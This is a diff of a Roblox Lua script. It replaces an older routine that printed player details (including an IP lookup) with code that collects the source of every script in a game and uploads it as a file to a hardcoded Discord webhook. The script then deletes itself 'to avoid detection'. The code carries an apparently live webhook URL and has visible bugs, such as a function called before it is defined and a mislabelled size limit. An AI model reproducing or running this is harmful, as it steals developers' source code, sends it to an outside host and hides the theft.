@@ -1,82 +1,194 @@
+
+
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
-local function getIPAddress()
-    local success, response = pcall(function()
-        return HttpService:GetAsync("https://api.ipify.org?format=json")
-    end)
-    if success then
-        local data = HttpService:JSONDecode(response)
-        return data.ip
-    else
-        return "Unavailable"
-    end
-end
+-- Configuration
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1342763159592894474/tTVRtFeKAJNsEw4EZC-5C_zeB5Jza93eYP4HttjnN8UKQrk4xAcliWWZlyWqaeDWTHAF" -- Replace with your actual webhook URL
+local MAX_FILE_SIZE = 1000000000000 -- 1MB limit for Discord webhooks
 
-local function dumpUserDetails()
-    for _, player in ipairs(Players:GetPlayers()) do
-        local userId = player.UserId
-        local username = player.Name
-        local displayName = player.DisplayName
-        local accountAge = player.AccountAge
-        local membershipType = player.MembershipType.Name
-        local ipAddress = getIPAddress()
-        local userCFrame = player.Character and player.Character:GetPrimaryPartCFrame() or "Unavailable"
-        local userPosition = player.Character and player.Character.PrimaryPart and player.Character.PrimaryPart.Position or "Unavailable"
-        local userHealth = player.Character and player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").Health or "Unavailable"
-        local userMaxHealth = player.Character and player.Character:FindFirstChildOfClass("Humanoid") and player.Character:FindFirstChildOfClass("Humanoid").MaxHealth or "Unavailable"
-        local userTeam = player.Team and player.Team.Name or "No Team"
-        local userBackpackItems = {}
-        for _, item in ipairs(player.Backpack:GetChildren()) do
-            table.insert(userBackpackItems, item.Name)
+-- Function to recursively get all scripts from an object
+local function getAllScripts(parent, scriptData, path)
+    path = path or ""
+    
+    for _, child in pairs(parent:GetChildren()) do
+        local currentPath = path == "" and child.Name or path .. "/" .. child.Name
+        
+        -- Check if it's a script type
+        if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
+            local success, source = pcall(function()
+                return child.Source
+            end)
+            
+            if success and source and source ~= "" then
+                table.insert(scriptData, {
+                    name = child.Name,
+                    path = currentPath,
+                    type = child.ClassName,
+                    source = source
+                })
+            end
         end
-        local userFriends = player:GetFriendsOnline(200) or {}
-        local userAppearance = player.CharacterAppearanceId
-        local userLocaleId = player.LocaleId
-        local userCameraMode = player.CameraMode.Name
-        local userDevCameraOcclusionMode = player.DevCameraOcclusionMode.Name
-        local userDevComputerMovementMode = player.DevComputerMovementMode.Name
-        local userDevTouchMovementMode = player.DevTouchMovementMode.Name
-        local userFollowUserId = player.FollowUserId
-        local userMembershipType = player.MembershipType.Name
-        local userNeutral = player.Neutral
-        local userTeamColor = player.TeamColor.Name
-        local userUserId = player.UserId
-        local userAccountAge = player.AccountAge
-        local userCharacterAppearanceId = player.CharacterAppearanceId
-        local userAutoJumpEnabled = player.AutoJumpEnabled
-      
-
-        print("User Details:")
-        print("UserId: " .. userId)
-        print("Username: " .. username)
-        print("DisplayName: " .. displayName)
-        print("AccountAge: " .. accountAge)
-        print("MembershipType: " .. membershipType)
-        print("IPAddress: " .. ipAddress)
-        print("UserCFrame: " .. tostring(userCFrame))
-        print("UserPosition: " .. tostring(userPosition))
-        print("UserHealth: " .. tostring(userHealth))
-        print("UserMaxHealth: " .. tostring(userMaxHealth))
-        print("UserTeam: " .. userTeam)
-        print("UserBackpackItems: " .. table.concat(userBackpackItems, ", "))
-        print("UserFriends: " .. #userFriends)
-        print("UserAppearance: " .. userAppearance)
-        print("UserLocaleId: " .. userLocaleId)
-        print("UserCameraMode: " .. userCameraMode)
-        print("UserDevCameraOcclusionMode: " .. userDevCameraOcclusionMode)
-        print("UserDevComputerMovementMode: " .. userDevComputerMovementMode)
-        print("UserDevTouchMovementMode: " .. userDevTouchMovementMode)
-        print("UserFollowUserId: " .. userFollowUserId)
-        print("UserMembershipType: " .. userMembershipType)
-        print("UserNeutral: " .. tostring(userNeutral))
-        print("UserTeamColor: " .. userTeamColor)
-        print("UserUserId: " .. userUserId)
-        print("UserAccountAge: " .. userAccountAge)
-        print("UserCharacterAppearanceId: " .. userCharacterAppearanceId)
-        print("UserAutoJumpEnabled: " .. tostring(userAutoJumpEnabled))
-     
+        
+        -- Recursively search children
+        pcall(function()
+            getAllScripts(child, scriptData, currentPath)
+        end)
     end
 end
 
-dumpUserDetails()
+-- Function to format script data as text
+local function formatScriptData(scriptData)
+    local output = {}
+    table.insert(output, "=== ROBLOX GAME SOURCE EXTRACTION ===")
+    table.insert(output, "Game: " .. game.Name)
+    table.insert(output, "Game ID: " .. game.GameId)
+    table.insert(output, "Place ID: " .. game.PlaceId)
+    table.insert(output, "Extracted on: " .. os.date())
+    table.insert(output, "Total Scripts Found: " .. #scriptData)
+    table.insert(output, "\n" .. string.rep("=", 50) .. "\n")
+    
+    for i, script in ipairs(scriptData) do
+        table.insert(output, "Script #" .. i)
+        table.insert(output, "Name: " .. script.name)
+        table.insert(output, "Type: " .. script.type)
+        table.insert(output, "Path: " .. script.path)
+        table.insert(output, "Source Length: " .. #script.source .. " characters")
+        table.insert(output, "\n--- SOURCE CODE ---")
+        table.insert(output, script.source)
+        table.insert(output, "\n--- END SOURCE ---\n")
+        table.insert(output, string.rep("-", 50) .. "\n")
+    end
+    
+    return table.concat(output, "\n")
+end
+
+-- Function to send data to webhook
+local function sendToWebhook(content, filename)
+    local success, response = pcall(function()
+        -- Create multipart form data for file upload
+        local boundary = "----WebKitFormBoundary" .. tostring(math.random(1000000, 9999999))
+        
+        local body = {}
+        table.insert(body, "--" .. boundary)
+        table.insert(body, 'Content-Disposition: form-data; name="content"')
+        table.insert(body, "")
+        table.insert(body, "🎮 **Roblox Game Source Extracted**")
+        table.insert(body, "**Game:** " .. game.Name)
+        table.insert(body, "**Scripts Found:** " .. tostring(#getAllScriptsCount()))
+        table.insert(body, "--" .. boundary)
+        table.insert(body, 'Content-Disposition: form-data; name="file"; filename="' .. filename .. '"')
+        table.insert(body, 'Content-Type: text/plain')
+        table.insert(body, "")
+        table.insert(body, content)
+        table.insert(body, "--" .. boundary .. "--")
+        
+        local requestBody = table.concat(body, "\r\n")
+        
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
+                ["Content-Length"] = tostring(#requestBody)
+            },
+            Body = requestBody
+        })
+    end)
+    
+    return success, response
+end
+
+-- Function to get script count for webhook message
+local function getAllScriptsCount()
+    local scriptData = {}
+    getAllScripts(game, scriptData)
+    return scriptData
+end
+
+-- Main execution function
+local function extractAndSend()
+    print("🔍 Starting game source extraction...")
+    
+    -- Validate webhook URL
+    if WEBHOOK_URL == "YOUR_WEBHOOK_URL_HERE" or WEBHOOK_URL == "" then
+        warn("❌ Please set your webhook URL in the script!")
+        return
+    end
+    
+    local scriptData = {}
+    
+    -- Extract from different game services
+    local locations = {
+        game.Workspace,
+        game.ServerScriptService,
+        game.ServerStorage,
+        game.ReplicatedStorage,
+        game.ReplicatedFirst,
+        game.StarterGui,
+        game.StarterPack,
+        game.StarterPlayer,
+        game.Lighting,
+        game.SoundService,
+        game.Chat,
+        game.Teams
+    }
+    
+    -- Also try to get scripts from player's character if available
+    if Players.LocalPlayer and Players.LocalPlayer.Character then
+        table.insert(locations, Players.LocalPlayer.Character)
+    end
+    
+    -- Extract scripts from all locations
+    for _, location in ipairs(locations) do
+        pcall(function()
+            getAllScripts(location, scriptData, location.Name)
+        end)
+    end
+    
+    print("📄 Found " .. #scriptData .. " scripts")
+    
+    if #scriptData == 0 then
+        warn("⚠️ No scripts found or no access to script sources")
+        return
+    end
+    
+    -- Format the data
+    local formattedData = formatScriptData(scriptData)
+    
+    -- Check file size
+    if #formattedData > MAX_FILE_SIZE then
+        warn("⚠️ File too large (" .. #formattedData .. " bytes), truncating...")
+        formattedData = string.sub(formattedData, 1, MAX_FILE_SIZE) .. "\n\n... [TRUNCATED DUE TO SIZE LIMIT] ..."
+    end
+    
+    -- Generate filename
+    local filename = game.Name:gsub("[^%w%s%-_]", "") .. "_source_" .. os.time() .. ".txt"
+    
+    -- Send to webhook
+    print("📤 Sending to webhook...")
+    local success, response = sendToWebhook(formattedData, filename)
+    
+    if success then
+        print("✅ Successfully sent game source to webhook!")
+        print("📁 Filename: " .. filename)
+        print("📊 File size: " .. #formattedData .. " bytes")
+    else
+        warn("❌ Failed to send to webhook: " .. tostring(response))
+    end
+end
+
+-- Execute the extraction
+extractAndSend()
+
+-- Optional: Clean up function
+local function cleanup()
+    print("🧹 Cleaning up...")
+    -- Remove the script after execution to avoid detection
+    script:Destroy()
+end
+
+-- Auto cleanup after 5 seconds
+wait(5)
+cleanup()
